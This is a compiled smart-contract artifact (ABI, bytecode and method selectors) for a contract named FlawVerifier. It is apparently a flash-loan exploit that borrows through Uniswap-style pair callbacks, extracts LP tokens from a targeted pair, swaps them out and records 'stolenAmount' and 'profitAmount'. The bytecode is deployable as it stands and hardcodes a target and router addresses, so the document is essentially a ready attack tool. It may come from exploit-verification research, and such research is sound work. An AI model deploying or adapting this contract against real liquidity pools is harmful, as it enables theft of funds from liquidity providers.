{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attemptFlash","inputs":[{"name":"plan","type":"tuple","internalType":"struct FlawVerifier.Plan","components":[{"name":"exploitPair","type":"address","internalType":"address"},{"name":"token0","type":"address","internalType":"address"},{"name":"token1","type":"address","internalType":"address"},{"name":"tokenOutPair","type":"address","internalType":"address"},{"name":"tokenOutRouter","type":"address","internalType":"address"},{"name":"capitalAmount","type":"uint256","internalType":"uint256"},{"name":"burnLp","type":"uint256","internalType":"uint256"},{"name":"previewStealLp","type":"uint256","internalType":"uint256"},{"name":"previewRepayLp","type":"uint256","internalType":"uint256"},{"name":"previewProfitLp","type":"uint256","internalType":"uint256"}]}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"biswapCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"croDefiSwapCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"exploitPair","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploitToken0","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploitToken1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"joeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidXCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidXv2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidxCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidxV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"mDexCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"seedCapitalUsed","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"smardexCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"stolenAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"stolenPair","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"stolenPairRouter","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60808060405234601557612af1908161001a8239f35b5f80fdfe608080604052600436101561001c575b50361561001a575f80fd5b005b5f5f3560e01c91826308f08bc414610515575081630ec80b23146104e957816310d1e85c1461013d578163118864e7146102c3578163139752c71461029b5781631d0032d31461013d57816331a38c89146102795781633c2448ed1461025e57816345677bc71461013d578163463defd1146102395781634904b43f1461013d578163493436241461021357816356d7b8cf146101f65781635ff972cc146101d95781636488f3701461013d5781636c813d291461013d578163848008121461013d578163999672551461013d578163a533d40e146101bc578163b9bc289714610194578163c26558b01461013d578163c41cfb4b1461013d578163cc1f2afa1461016d578163edf857d114610142575063ee22dd871461013d575f61000f565b610538565b3461016a578060031936011261016a576003546040516001600160a01b039091168152602090f35b80fd5b3461016a578060031936011261016a5760206040515f516020612a9c5f395f51905f528152f35b3461016a578060031936011261016a576005546040516001600160a01b039091168152602090f35b3461016a578060031936011261016a576020600854604051908152f35b3461016a578060031936011261016a576020600154604051908152f35b3461016a578060031936011261016a576020600754604051908152f35b3461016a578060031936011261016a57546040516001600160a01b039091168152602090f35b3461016a578060031936011261016a57602060ff60025460081c166040519015158152f35b3461016a578060031936011261016a57610276611294565b80f35b3461016a578060031936011261016a57602060ff600254166040519015158152f35b3461016a578060031936011261016a576004546040516001600160a01b039091168152602090f35b346104a0576101403660031901126104a0573033036104b8576102e46111e0565b6024356001600160a01b038116908181036104a057506044356001600160a01b038116908181036104a057506064356001600160a01b038116908181036104a057506084356001600160a01b03811692908381036104a0575060a4359360c435956040519060e0820182811067ffffffffffffffff8211176104a457889160c09160405260018060a01b0316928381528460208201528560408201528660608201528760808201528860a082015201526001600160601b0360a01b60095416176009556001600160601b0360a01b600a541617600a556001600160601b0360a01b600b541617600b556001600160601b0360a01b600c541617600c556001600160601b0360a01b600d541617600d5580600e5581600f5560018060a01b0361040a6111e0565b16916040519060208201526020815261042460408261122f565b823b156104a057610467925f928360405180968195829463022c0d9f60e01b84526004840152836024840152306044840152608060648401526084830190611251565b03925af1801561049557610485575b60206001541515604051908152f35b5f61048f9161122f565b5f610476565b6040513d5f823e3d90fd5b5f80fd5b634e487b7160e01b5f52604160045260245ffd5b60405162461bcd60e51b815260206004820152600960248201526873656c66206f6e6c7960b81b6044820152606490fd5b346104a0575f3660031901126104a05760025460405160109190911c6001600160a01b03168152602090f35b346104a0575f3660031901126104a0576006546001600160a01b03168152602090f35b346104a05760803660031901126104a0576004356001600160a01b038116908181036104a05750602435906044359060643567ffffffffffffffff81116104a057366023820112156104a057806004013567ffffffffffffffff81116104a0576024820192818301913660248401116104a057506009546001600160a01b031633036111a957300361117057600e54938486149081611167575b501561112d576020919003126104a057600f549035036110f357600c546040516370a0823160e01b81523060048201529190602090839060249082906001600160a01b03165afa918215610495575f926110bf575b50600a5461063f9082906001600160a01b03166123ed565b6040519061064c826111f6565b81525f60208201525f604082015260206106bc6106676125fc565b600a54600b546040516347a1248560e01b81523060048201526001600160a01b03928316602482018190525f6044830152610140606483015290968795869592946106d194929392169161014487019061202a565b93608486015260a485015260c4840190612180565b5f61012483015203815f5f516020612a9c5f395f51905f525af1908115610495575f9161108d575b50600f5480911061104f5760095461071b9082906001600160a01b03166123ed565b6020604051610729816111f6565b5f81525f828201525f604082015261073f6125fc565b600a54600b54600c5460405163524e595360e11b81523060048201526001600160a01b03938416602482015291831660448301526064820196909652941660848501525f60a4850181905260c485015261016060e4850152839182916107ba906107ae9061016485019061202a565b91610104840190612180565b03815f5f516020612a9c5f395f51905f525af1801561049557611020575b50600c546040516370a0823160e01b81523060048201526001600160a01b0390911691602082602481865afa8015610495575f90610fec575b61081b92506117f5565b918215610fb8576103e88102908082046103e81490151715610fa4576103e590049060018201809211610fa457600a54600b54604051630240bc6b60e21b8152916001600160a01b039081169116606083600481875afa918215610495575f935f93610f6c575b50604051630dfe168160e01b815291602083600481895afa928315610495575f93610f4b575b5060405163d21220a760e01b8152926020846004818a5afa938415610495575f94610f1a575b506001600160a01b031682811480610f08575b15610e9f5750505050906001600160701b038091169116905b6040516318160ddd60e01b815290602082600481875afa9081156104955786925f92610e66575b509261092d9386612634565b9083821015610e3057600d5461094e9183916001600160a01b0316906124f9565b600d54600a54600b5460408051635d5155ef60e11b81526001600160a01b039384166004820152918316602483015260448201949094525f60648201819052608482018190523060a48301524260c4830152909392849260e49284929091165af1801561049557610e05575b50600b546040516370a0823160e01b8152306004820152906001600160a01b0316602082602481845afa918215610495575f92610dd1575b5081610c30575b5050600a546040516370a0823160e01b81523060048201526001600160a01b039091169190602081602481865afa80156104955782915f91610bfb575b5010610bc05760095460405163a9059cbb60e01b60208201526001600160a01b039091166024820152604480820192909252908152610a7f91610a7a60648361122f565b612699565b600c545f80546001600160a01b0319166001600160a01b039290921691821790556040516370a0823160e01b8152306004820152602081602481855afa908115610495575f91610b8e575b508060015515610b5b5760028054600954610100600160b01b031990911660109190911b62010000600160b01b031617610100179055600a54600380546001600160a01b03199081166001600160a01b0393841617909155600b5460048054831691841691909117905560058054821693909317909255600d54600680549093169116179055600e54600755600855005b60405162461bcd60e51b815260206004820152600b60248201526a1e995c9bc81c1c9bd99a5d60aa1b6044820152606490fd5b90506020813d602011610bb8575b81610ba96020938361122f565b810103126104a057515f610aca565b3d9150610b9c565b60405162461bcd60e51b81526020600482015260136024820152721c995c185e5b595b9d081cda1bdc9d19985b1b606a1b6044820152606490fd5b9150506020813d602011610c28575b81610c176020938361122f565b810103126104a0578190515f610a36565b3d9150610c0a565b600d54610c489183916001600160a01b0316906124f9565b60405190610c5760608361122f565b6002825260208201604036823760018060a01b03600b5416835115610dbd57815260018060a01b03600a5416835160011015610dbd57604084929394015260018060a01b03600d5416916040519384926338ed173960e01b845260a484019160048501525f602485015260a060448501525180915260c4830191905f5b818110610d9b5750505091815f81819530606483015242608483015203925af1801561049557610d05575b806109f9565b3d805f833e610d14818361122f565b8101906020818303126104a05780519067ffffffffffffffff82116104a0570181601f820112156104a05780519067ffffffffffffffff82116104a4576020808360051b9381850190610d6a604051928361122f565b815201928201019283116104a057602001905b828210610d8b575050610cff565b8151815260209182019101610d7d565b82516001600160a01b0316845286945060209384019390920191600101610cd4565b634e487b7160e01b5f52603260045260245ffd5b9091506020813d602011610dfd575b81610ded6020938361122f565b810103126104a05751905f6109f2565b3d9150610de0565b604090813d8311610e29575b610e1b818361122f565b810103126104a0575f6109ba565b503d610e11565b60405162461bcd60e51b815260206004820152600e60248201526d6e6f742070726f66697461626c6560901b6044820152606490fd5b925090506020823d602011610e97575b81610e836020938361122f565b810103126104a0579051859161092d610921565b3d9150610e76565b149182610ef5575b505015610ec0576001600160701b0391821691166108fa565b60405162461bcd60e51b815260206004820152600d60248201526c0e0c2d2e440dad2e6dac2e8c6d609b1b6044820152606490fd5b6001600160a01b03161490505f80610ea7565b506001600160a01b03841682146108e1565b610f3d91945060203d602011610f44575b610f35818361122f565b810190611275565b925f6108ce565b503d610f2b565b610f6591935060203d602011610f4457610f35818361122f565b915f6108a8565b909250610f9291935060603d606011610f9d575b610f8a818361122f565b8101906118d4565b50929092915f610882565b503d610f80565b634e487b7160e01b5f52601160045260245ffd5b60405162461bcd60e51b815260206004820152600c60248201526b06e6f2073746f6c656e204c560a41b6044820152606490fd5b506020823d602011611018575b816110066020938361122f565b810103126104a05761081b9151610811565b3d9150610ff9565b6110419060203d602011611048575b611039818361122f565b8101906117e6565b505f6107d8565b503d61102f565b60405162461bcd60e51b81526020600482015260166024820152750696e73756666696369656e74206d696e746564204c560541b6044820152606490fd5b90506020813d6020116110b7575b816110a86020938361122f565b810103126104a057515f6106f9565b3d915061109b565b9091506020813d6020116110eb575b816110db6020938361122f565b810103126104a05751905f610627565b3d91506110ce565b60405162461bcd60e51b81526020600482015260126024820152711d5b995e1c1958dd1959081c185e5b1bd85960721b6044820152606490fd5b60405162461bcd60e51b8152602060048201526012602482015271756e657870656374656420616d6f756e747360701b6044820152606490fd5b9050155f6105d2565b60405162461bcd60e51b81526020600482015260116024820152703ab732bc3832b1ba32b21039b2b73232b960791b6044820152606490fd5b60405162461bcd60e51b815260206004820152600f60248201526e3ab732bc3832b1ba32b2103830b4b960891b6044820152606490fd5b6004356001600160a01b03811681036104a05790565b6060810190811067ffffffffffffffff8211176104a457604052565b610140810190811067ffffffffffffffff8211176104a457604052565b90601f8019910116810190811067ffffffffffffffff8211176104a457604052565b805180835260209291819084018484015e5f828201840152601f01601f1916010190565b908160209103126104a057516001600160a01b03811681036104a05790565b60025460ff81166117e35760ff191660011760025560405163c45a015560e01b81526020816004815f516020612a9c5f395f51905f525afa908115610495575f916117c4575b505f905f80604051602081019063574f2ba360e01b82526004815261130060248261122f565b5190845afa61130d611840565b90806117b8575b61179a575b508115611796575f5b82811061132e57505050565b5f5f806040516020810190631e3dd18b60e01b82528560248201526024815261135860448261122f565b5190865afa611365611840565b908061178a575b611765575b506001600160a01b03811690811561175b5761138b61187f565b828152604051630dfe168160e01b81529091602082600481875afa918215610495575f9261173b575b50602083019160018060a01b031682526040519363d21220a760e01b8552602085600481845afa948515610495575f9561171b575b506001600160a01b03909416604084810191825251630240bc6b60e21b81529094606082600481845afa908115610495575f925f926116ef575b5060206004916001600160701b0360608901951685526001600160701b036080890194168452604051928380926318160ddd60e01b82525afa908115610495575f916116be575b508060a0870152159182156116b4575b5081156116aa575b5061169e57815184516040516303e21fa960e61b81526001600160a01b03928316939092909116906020836004815f516020612a9c5f395f51905f525afa918215610495576114e2946114dc945f9461167e575b50611ced565b83611e52565b611642578051835160405163e6a4390560e01b602082019081526001600160a01b03938416602483018190529390921660448201819052611571936114dc935f938491829161153e81606481015b03601f19810183528261122f565b5190735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f5afa61155f611840565b9080611672575b61164a575b5061190a565b6116425751915160405163e6a4390560e01b602082019081526001600160a01b039485166024830181905294909216604482018190526115fb946115f5935f93849182916115c28160648101611530565b519073c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac5afa6115e3611840565b9080611636575b61160e575b50611b9f565b90611e52565b611609576001905b01611322565b505050565b80519193506001600160a01b039161162e91602091810182019101611275565b16915f6115ef565b506020815110156115ea565b505050505050565b80519193506001600160a01b039161166a91602091810182019101611275565b16915f61156b565b50602081511015611566565b61169791945060203d8111610f4457610f35818361122f565b925f6114d6565b50505050600190611603565b905051155f611482565b511591505f61147a565b90506020813d82116116e7575b816116d86020938361122f565b810103126104a057515f61146a565b3d91506116cb565b60209350600491925061170f9060603d8111610f9d57610f8a818361122f565b50939093929150611423565b61173491955060203d8111610f4457610f35818361122f565b935f6113e9565b61175491925060203d8111610f4457610f35818361122f565b905f6113b4565b5050600190611603565b80516001600160a01b03925061178391602091810182019101611275565b165f611371565b5060208151101561136c565b5050565b8051919250602080820192820191909103126104a05751905f611319565b50602081511015611314565b6117dd915060203d602011610f4457610f35818361122f565b5f6112da565b50565b908160209103126104a0575190565b91908203918211610fa457565b81810292918115918404141715610fa457565b811561181f570490565b634e487b7160e01b5f52601260045260245ffd5b91908201809211610fa457565b3d1561187a573d9067ffffffffffffffff82116104a4576040519161186f601f8201601f19166020018461122f565b82523d5f602084013e565b606090565b6040519060c0820182811067ffffffffffffffff8211176104a4576040525f60a0838281528260208201528260408201528260608201528260808201520152565b51906001600160701b03821682036104a057565b908160609103126104a0576118e8816118c0565b9160406118f7602084016118c0565b92015163ffffffff811681036104a05790565b92919261191561187f565b936001600160a01b031690811561160957818552737a250d5630b4cf539739df2c5dacb4c659f2488d60208601526040516370a0823160e01b81525f516020612a9c5f395f51905f526004820152602081602481865afa908115610495575f91611b6d575b5060a08601526040516318160ddd60e01b8152602081600481865afa908115610495575f91611b3b575b508060808701521561160957604051630240bc6b60e21b815291606083600481845afa938415610495575f935f95611b13575b50604051630dfe168160e01b815292602084600481865afa928315610495576004945f94611af1575b506020906040519586809263d21220a760e01b82525afa938415610495575f94611ad0575b506001600160a01b0390811692169081831480611abb575b15611a5f575050506001600160701b039182166040860152501660608301525b565b6001600160a01b0316149182611aa8575b505015611a8f576001600160701b038092166040850152166060830152565b50505f82525f60208301525f60808301525f60a0830152565b6001600160a01b03161490505f80611a70565b506001600160a01b0384811690821614611a3d565b611aea91945060203d602011610f4457610f35818361122f565b925f611a25565b6020919450611b0c90823d8411610f4457610f35818361122f565b9390611a00565b909450611b3091935060603d606011610f9d57610f8a818361122f565b50929092935f6119d7565b90506020813d602011611b65575b81611b566020938361122f565b810103126104a057515f6119a4565b3d9150611b49565b90506020813d602011611b97575b81611b886020938361122f565b810103126104a057515f61197a565b3d9150611b7b565b929192611baa61187f565b936001600160a01b03169081156116095781855273d9e1ce17f2641f24ae83637ab66a2cca9c378b9f60208601526040516370a0823160e01b81525f516020612a9c5f395f51905f526004820152602081602481865afa908115610495575f91611b6d575060a08601526040516318160ddd60e01b8152602081600481865afa908115610495575f91611b3b57508060808701521561160957604051630240bc6b60e21b815291606083600481845afa938415610495575f935f95611b135750604051630dfe168160e01b815292602084600481865afa928315610495576004945f94611af157506020906040519586809263d21220a760e01b82525afa938415610495575f94611ad057506001600160a01b0390811692169081831480611abb5715611a5f575050506001600160701b03918216604086015250166060830152565b9392909193611cfa61187f565b946001600160a01b0316918215611e34578286526001600160a01b03166020808701919091526040516370a0823160e01b81525f516020612a9c5f395f51905f5260048201529081602481865afa908115610495575f91611b6d575060a08601526040516318160ddd60e01b8152602081600481865afa908115610495575f91611b3b57508060808701521561160957604051630240bc6b60e21b815291606083600481845afa938415610495575f935f95611b135750604051630dfe168160e01b815292602084600481865afa928315610495576004945f94611af157506020906040519586809263d21220a760e01b82525afa938415610495575f94611ad057506001600160a01b0390811692169081831480611abb5715611a5f575050506001600160701b03918216604086015250166060830152565b50505050565b908160209103126104a0575180151581036104a05790565b81516001600160a01b031615801561201e575b8015612012575b61200c57611e8e60a0830151606083015160808401519060a0850151926121a7565b80156120055760e09160405191611ea660e08461122f565b60e03684378083528060011c60208401528060021c60408401528060031c60608401528060041c60808401528060051c60a084015260061c60c08301525f5b6007811015611ffc57611eff8160051b8401518684612239565b6101208101805115611ff2576040805163118864e760e01b815283516001600160a01b039081166004830152602080860151821660248401529285015181166044830152606085015181166064830152608085015116608482015260a084015160a482015260c084015160c48201528784015160e482015261010090930151610104840152905161012483015281610144815f305af15f9181611fc2575b50611fae575b506001905b01611ee5565b611fb8575f611fa3565b5050505050600190565b611fe491925060203d8111611feb575b611fdc818361122f565b810190611e3a565b905f611f9d565b503d611fd2565b5050600190611fa8565b50505050505f90565b5050505f90565b50505f90565b50608082015115611e6c565b5060a082015115611e65565b90602081019151916020825282518091526040820191602060408360051b8301019401925f915b83831061206057505050505090565b9091929394603f19828203018352855190602081019151916020825282518091526040820190602060408260051b8501019401925f5b8281106120b757505050505060208060019297019301930191939290612051565b9091929394603f198382030185528551602082019051916020815282518092526040810190602060408460051b8301019401925f915b81831061210e57505050505060208060019297019501910192919092612096565b9091929394602080600192603f1985820301885288519060a08061213b845160c0855260c0850190611251565b938780831b038682015116868501528780831b0360408201511660408501526060810151606085015260808101516080850152015191015297019501930191906120ed565b905f905b6003821061219157505050565b6020806001928551815201930191019091612184565b90916001841115612231575f935f198101818111610fa457939291905b8486106121d357505050505090565b90919293946121e28682611833565b60018101809111610fa45760011c90846121fe84868986612757565b1161220f5750945b939291906121c4565b95505f1981019081111561220657634e487b7160e01b5f52601160045260245ffd5b505050505f90565b90916040519061224882611212565b5f82525f60208301525f60408301525f60608301525f60808301525f60a08301525f60c08301525f60e08301525f6101008301525f6101208301528181156123e557506060830190815191608085016122ab81519460a088019586519186612757565b93841580156123d8575b6123cd57906122cb9183519151905191856127e7565b908115809181156123c1575b506123b7576103e88202908282046103e8141715610fa4576103e5900460018101809111610fa4578361231a91604089015160608a01519060808b015192612634565b93841580156123ad575b6123a357508451602080870151604090970151885191909801516001600160a01b03928316989783169790831692918216911661236187876117f5565b976040519961236f8b611212565b8a5260208a015260408901526060880152608087015260a086015260c085015260e084015261010083015261012082015290565b9550505050505090565b5083851015612324565b5050505091505090565b9050518210155f6122d7565b505050505091505090565b5060a088015185116122b5565b935050505090565b604051636eb1769f60e11b81523060048201525f516020612a9c5f395f51905f526024820152916020836044816001600160a01b0386165afa928315610495575f936124c5575b5082101561179657611a5d9161247f575b6040519063095ea7b360e01b60208301525f516020612a9c5f395f51905f5260248301525f19604483015260448252610a7a60648361122f565b6124c060405163095ea7b360e01b60208201525f516020612a9c5f395f51905f5260248201525f6044820152604481526124ba60648261122f565b82612699565b612445565b9092506020813d6020116124f1575b816124e16020938361122f565b810103126104a05751915f612434565b3d91506124d4565b604051636eb1769f60e11b81523060048201526001600160a01b038316602482015292602084806044810103816001600160a01b0386165afa938415610495575f946125c8575b5083101561160957611a5d92612589575b60405163095ea7b360e01b60208201526001600160a01b0390921660248301525f196044808401919091528252610a7a60648361122f565b60405163095ea7b360e01b60208201526001600160a01b03831660248201525f60448083019190915281526125c3906124ba60648261122f565b612551565b9093506020813d6020116125f4575b816125e46020938361122f565b810103126104a05751925f612540565b3d91506125d7565b604051906020820182811067ffffffffffffffff8211176104a45760405260608252816040519061262e60208361122f565b5f825252565b9192909282158015612691575b611ffc576001945b80861061265857505050505090565b6126628187611833565b60011c908461267385858986612757565b1061267e5750612649565b955060018101809111610fa45794612649565b508415612641565b5f91829182602083519301915af16126af611840565b901561271e57805190816126c1575050565b6020806126d2938301019101611e3a565b156126d957565b60405162461bcd60e51b815260206004820152601760248201527f746f6b656e206f702072657475726e65642066616c73650000000000000000006044820152606490fd5b60405162461bcd60e51b81526020600482015260116024820152701d1bdad95b8818d85b1b0819985a5b1959607a1b6044820152606490fd5b9192821580156127df575b612231578061277b6127806127879361277b8787611802565b611815565b9486611802565b928215806127d7575b612231578183108015906127cd575b61223157836127be6127ca956127b8866127c4966117f5565b936117f5565b90612875565b90611833565b90565b508084101561279f565b508315612790565b508015612762565b9091928115801561286a575b612231576001935f198401848111610fa45783612812848488856128e0565b10612860575b80861061282757505050505090565b6128318187611833565b60011c9084612842858589866128e0565b1061284d5750612818565b955060018101809111610fa45794612818565b5050505050505f90565b5060018311156127f3565b9182158080156128d8575b80156128d0575b612231576103e584029384046103e5141715610fa4576128a79083611802565b906103e88102908082046103e81490151715610fa4576127ca926128ca91611833565b90611815565b508115612887565b508215612880565b929091831580156129b2575b80156129aa575b80156129a2575b6122315761290884846129ba565b9384158015612998575b611ffc57612921828587612875565b948515801561298e575b6128605761294781612941889361294d956117f5565b96611833565b926117f5565b9181158015612986575b611ffc5761296f61277b9261277b8361297597611802565b94611802565b80821015612981575090565b905090565b508215612957565b508286101561292b565b5080851015612912565b5081156128fa565b5080156128f3565b5082156128ec565b90811590818015612a93575b612005576129d48380611802565b906107cd8202918083046107cd1481151715610fa457623cda2902918083046107cd1490151715610fa45783610f940290610f9482048503610fa457612a1991611802565b6103e88102908082046103e81490151715610fa457612a3791611833565b9060018201808311610fa45760011c825b838210612a745750506107cd83029283046107cd141715610fa4576107ca91612a70916117f5565b0490565b909250612a8a83612a858184611815565b611833565b60011c90612a48565b5080156129c656fe000000000000000000000000364f17a23ae4350319b7491224d10df5796190bca2646970667358221220821783a118ab95aeb5e049ac3aeaed4d5e9885fcc164cdf647ec6055f1d2bc2764736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","attemptFlash((address,address,address,address,address,uint256,uint256,uint256,uint256,uint256))":"118864e7","biswapCall(address,uint256,uint256,bytes)":"45677bc7","croDefiSwapCall(address,uint256,uint256,bytes)":"6c813d29","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","exploitPair()":"0ec80b23","exploitToken0()":"edf857d1","exploitToken1()":"139752c7","hypothesisValidated()":"463defd1","joeCall(address,uint256,uint256,bytes)":"ee22dd87","liquidXCall(address,uint256,uint256,bytes)":"4904b43f","liquidXv2Call(address,uint256,uint256,bytes)":"c41cfb4b","liquidxCall(address,uint256,uint256,bytes)":"6488f370","liquidxV2Call(address,uint256,uint256,bytes)":"99967255","mDexCall(address,uint256,uint256,bytes)":"1d0032d3","pancakeCall(address,uint256,uint256,bytes)":"84800812","profitAmount()":"5ff972cc","profitToken()":"49343624","seedCapitalUsed()":"56d7b8cf","smardexCall(address,uint256,uint256,bytes)":"c26558b0","stolenAmount()":"a533d40e","stolenPair()":"b9bc2897","stolenPairRouter()":"08f08bc4","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}